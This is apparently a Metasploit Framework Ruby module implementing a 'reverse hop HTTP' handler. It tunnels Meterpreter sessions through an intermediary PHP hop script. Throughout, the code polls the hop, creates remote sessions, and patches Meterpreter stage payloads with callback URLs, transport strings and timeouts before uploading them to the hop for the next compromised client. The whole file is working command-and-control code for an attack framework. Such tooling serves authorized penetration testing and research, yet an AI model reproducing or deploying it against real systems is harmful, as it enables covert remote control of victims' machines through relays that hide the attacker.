# -*- coding: binary -*-
require 'rex/io/stream_abstraction'
require 'rex/sync/ref'
require 'msf/core/handler/reverse_http'
require 'uri'

module Msf
module Handler

###
#
# This handler implements the HTTP hop tunneling interface.
# It acts like an HTTP server to the meterpreter packet dispatcher but
# as an HTTP client to actually send and receive the data from the hop.
#
###
module ReverseHopHttp

  include Msf::Handler::ReverseHttp

  @@hophandlers = {} # Keeps track of what hops have active handlers

  #
  # Magic bytes to know we are talking to a valid hop
  #
  def magic
    'TzGq'
  end

  #
  # Returns the string representation of the handler type
  #
  def self.handler_type
    return "reverse_hop_http"
  end

  #
  # Returns the connection-described general handler type, in this case
  # 'tunnel'.
  #
  def self.general_handler_type
    "tunnel"
  end

  #
  # Sets up a handler. Doesn't do much since it's all in start_handler.
  #
  def setup_handler
    self.handlers = {}
  end

  #
  # Starts the handler along with a monitoring thread to handle data transfer
  #
  def start_handler
    uri = URI(full_uri)
    #Our HTTP client for talking to the hop
    self.mclient = Rex::Proto::Http::Client.new(
      uri.host,
      uri.port,
      {
        'Msf'        => framework
      }
    )
    #First we need to verify we will not stomp on another handler's hop
    if @@hophandlers.has_key? full_uri
      raise RuntimeError, "Already running a handler for hop #{full_uri}."
    end
    @@hophandlers[full_uri] = self
    self.monitor_thread = Rex::ThreadFactory.spawn('ReverseHopHTTP', false, uri,
        self) do |uri, hop_http|
      control = "#{uri.request_uri}control"
      hop_http.control = control
      hop_http.send_new_stage(control) # send stage to hop
      @finish = false
      delay = 1 # poll delay
      until @finish and hop_http.handlers.empty?
        sleep delay
        delay = delay + 1 if delay < 10 # slow down if we're not getting anything
        crequest = hop_http.mclient.request_raw({'method' => 'GET', 'uri' => control})
        res = hop_http.mclient.send_recv(crequest) # send poll to the hop
        next if res == nil
        if res.error
          print_error(res.error)
          next
        end

        # validate response
        received = res.body
        magic = hop_http.magic
        next if received.length < 12 or received.slice!(0, magic.length) != magic

        # good response
        delay = 0 # we're talking, speed up
        urlen = received.slice!(0,4).unpack('V')[0]
        urlpath = received.slice!(0,urlen)

        #received is now the binary contents of the message
        if hop_http.handlers.include? urlpath
          pack = Rex::Proto::Http::Packet.new
          pack.body = received
          hop_http.current_url = urlpath
          hop_http.handlers[urlpath].call(hop_http, pack)
        else
          #New session!
          conn_id = urlpath.gsub("/","")
          # Short-circuit the payload's handle_connection processing for create_session
          # We are the dispatcher since we need to handle the comms to the hop
          create_session(hop_http, {
            :passive_dispatcher => self,
            :conn_id            => conn_id,
            :url                => uri.to_s + conn_id + "/\x00",
            :expiration         => datastore['SessionExpirationTimeout'].to_i,
            :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
            :ssl                => false,
          })
          # send new stage to hop so next inbound session will get a unique ID.
          hop_http.send_new_stage(control)
        end
      end
      hop_http.monitor_thread = nil #make sure we're out
      @@hophandlers.delete(full_uri)
    end
  end

  #
  # Stops the handler and monitoring thread
  #
  def stop_handler
    @finish = true
  end

  #
  # Adds a resource. (handler for a session)
  #
  def add_resource(res, opts={})
    self.handlers[res] = opts['Proc']
    start_handler if self.monitor_thread == nil
  end

  #
  # Removes a resource.
  #
  def remove_resource(res)
    self.handlers.delete(res)
  end

  #
  # Implemented for compatibility reasons, does nothing
  #
  def close_client(cli)
  end

  #
  # Sends data to hop
  #
  def send_response(resp)
    if not resp.body.empty?
      crequest = self.mclient.request_raw(
          'method' => 'POST',
          'uri' => self.control,
          'data' => resp.body,
          'headers' => {'X-urlfrag' => self.current_url}
      )
      # if receiving POST data, hop does not send back data, so we can stop here
      self.mclient.send_recv(crequest)
    end
  end

  #
  # Return the URI of the hop point.
  #
  def full_uri
    uri = datastore['HOPURL']
    return uri if uri.end_with? '/'
    return "#{uri}/" if uri.end_with? '?'
    "#{uri}?/"
  end

  #
  # Returns a string representation of the local hop
  #
  def localinfo
    "Hop client"
  end

  #
  # Returns the URL of the remote hop end
  #
  def peerinfo
    URI(full_uri).host
  end

  #
  # Initializes the Hop HTTP tunneling handler.
  #
  def initialize(info = {})
    super

    register_options(
      [
        OptString.new('HOPURL', [ true, "The full URL of the hop script, e.g. http://a.b/hop.php" ])
      ], Msf::Handler::ReverseHopHttp)

  end

  #
  # Generates and sends a stage up to the hop point to be ready for the next client
  #
  def send_new_stage(control)
    conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
    url = full_uri + conn_id + "/\x00"

    print_status("Preparing stage for next session #{conn_id}")
    blob = self.stage_payload

    # Replace the user agent string with our option
    i = blob.index("METERPRETER_UA\x00")
    if i
      str = datastore['MeterpreterUserAgent'][0,255] + "\x00"
      blob[i, str.length] = str
    end

    # Replace the transport string first (TRANSPORT_SOCKET_SSL)
    i = blob.index("METERPRETER_TRANSPORT_SSL")
    if i
      str = "METERPRETER_TRANSPORT_HTTP#{ssl? ? "S" : ""}\x00"
      blob[i, str.length] = str
    end

    conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
    i = blob.index("https://" + ("X" * 256))
    if i
      url = full_uri + conn_id + "/\x00"
      blob[i, url.length] = url
    end
    print_status("Patched URL at offset #{i}...")

    i = blob.index([0xb64be661].pack("V"))
    if i
      str = [ datastore['SessionExpirationTimeout'] ].pack("V")
      blob[i, str.length] = str
    end

    i = blob.index([0xaf79257f].pack("V"))
    if i
      str = [ datastore['SessionCommunicationTimeout'] ].pack("V")
      blob[i, str.length] = str
    end

    blob = encode_stage(blob)

    #send up
    crequest = self.mclient.request_raw(
        'method' => 'POST',
        'uri' => control,
        'data' => blob,
        'headers' => {'X-init' => 'true'}
    )
    res = self.mclient.send_recv(crequest)
    print_status("Uploaded stage to hop #{full_uri}")
    print_error(res.error) if res != nil and res.error

    #return conn info
    [conn_id, url]
  end

  attr_accessor :monitor_thread # :nodoc:
  attr_accessor :handlers # :nodoc:
  attr_accessor :mclient # :nodoc:
  attr_accessor :current_url # :nodoc:
  attr_accessor :control # :nodoc:

end

end
end

